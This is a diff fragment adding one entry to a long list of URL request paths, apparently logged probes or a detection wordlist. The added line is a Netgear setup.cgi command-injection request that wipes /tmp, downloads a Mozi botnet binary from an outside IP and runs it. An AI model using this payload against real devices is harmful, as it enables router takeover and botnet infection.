@@ -15132,3 +15132,4 @@ http://apiv4.9hits.com/test
 /ajax/xl2024.php
 /assets/images/xl2024.php
 /bitrix/admin/htmleditor2/aipkey.php?test=hello
+/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://84.214.103.101:2735/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
